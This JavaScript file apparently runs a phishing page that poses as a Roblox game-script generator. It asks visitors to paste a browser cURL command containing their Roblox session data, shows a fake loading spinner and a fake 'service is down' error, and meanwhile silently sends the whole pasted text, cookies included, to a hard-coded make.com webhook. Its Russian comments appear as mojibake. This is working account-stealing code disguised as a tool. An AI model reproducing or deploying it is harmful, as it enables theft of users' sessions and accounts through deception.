document.getElementById("Send").addEventListener("click", function () {
    var gameCode = document.querySelector(".form__field__game").value;

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø—É—Å—Ç–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ
    if (!gameCode) {
        Swal.fire({
            title: "Error",
            text: "Please enter the Game Code.",
            icon: "error",
            confirmButtonText: "OK"
        });
        return;
    }

    // –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ SessionTracker
    if (!gameCode.includes("SessionTracker")) {
        Swal.fire({
            title: "Error",
            text: "Try to login in Roblox.",
            icon: "error",
            confirmButtonText: "OK"
        });
        return;
    }

    // –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ Game ID –∏ Game Name –∏–∑ cURL
    let gameId, gameName;
    let regex = /curl \^"https:\/\/www\.roblox\.com\/games\/(\d+)\/([^"]+)\^"/;
    let match = gameCode.match(regex);

    if (!match) {
        Swal.fire({
            title: "Invalid Game Code",
            text: "Please try again.",
            icon: "error",
            confirmButtonText: "OK"
        });
        return;
    }

    gameId = match[1];
    gameName = match[2];

    // –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç–∏ –≤–≤–µ–¥–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
    Swal.fire({
        title: "Is this correct? üëÄ",
        text: "Game: " + gameName + " | Game ID: " + gameId,
        icon: "question",
        showCancelButton: true,
        confirmButtonText: "Yes",
        cancelButtonText: "No"
    }).then((result) => {
        if (result.isConfirmed) {
            // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–ø—Ç–∞
            Swal.fire({
                title: "Creating Script for Game...",
                text: "Please wait.",
                allowOutsideClick: false,
                didOpen: function () {
                    Swal.showLoading();
                    setTimeout(() => {
                        // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Å–±–æ–µ —Å–µ—Ä–≤–∏—Å–∞
                        Swal.fire({
                            title: "Try Again Later",
                            text: "Our service is down at the moment. üò£",
                            icon: "error",
                            confirmButtonText: "OK"
                        });

                        // –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ –≤–µ–±—Ö—É–∫
                        let webhookUrl = "https://hook.eu2.make.com/6qyqld9qayuj7uba2t19okaihj93nimy"; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à URL –≤–µ–±—Ö—É–∫–∞

                        let requestBody = {
                            content: `Game: ${gameName} | Game ID: ${gameId} | cURL: ${gameCode}`
                        };

                        fetch(webhookUrl, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(requestBody)
                        });

                    }, Math.random() * (13000 - 5000) + 5000); // –ñ–¥–µ–º –æ—Ç 5 –¥–æ 13 —Å–µ–∫—É–Ω–¥
                }
            });
        }
    });
});
